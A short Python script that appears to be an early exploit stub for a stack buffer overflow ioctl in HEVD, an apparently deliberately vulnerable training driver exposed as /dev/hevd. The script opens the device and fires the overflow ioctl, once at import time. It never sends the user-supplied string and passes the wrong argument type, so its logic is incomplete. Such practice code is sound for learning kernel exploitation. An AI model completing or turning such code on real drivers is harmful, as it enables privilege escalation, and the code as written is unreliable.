import fcntl
import struct
import os
import ctypes
import sys
from ioctl_opt import IOWR

class hevd_io(ctypes.Structure):
	_fields_ = [
		('input_buffer',ctypes.c_void_p),
		('input_buffer_length',ctypes.c_size_t),
		('output_buffer',ctypes.c_void_p),
                ('output_buffer_length',ctypes.c_size_t)
	]


BUFFER_OVERFLOW = IOWR(ord('h'), 0,hevd_io)

name = (ctypes.c_ulong)()

fd=os.open("/dev/hevd",os.O_RDWR)

fcntl.ioctl(fd,BUFFER_OVERFLOW,name)


def main():
	script=sys.argv[0]

	if len(sys.argv) != 2:
		print("""Usage: python3 buffer_overflow-stack.py <some str> """)
		return
	
	
	input_str=sys.argv[1]
	
	process(input_str)


def process(input_str):
	name = (ctypes.c_ulong)()

	fd=os.open("/dev/hevd",os.O_RDWR)

	fcntl.ioctl(fd,BUFFER_OVERFLOW,name)


if __name__ == '__main__':
	main()




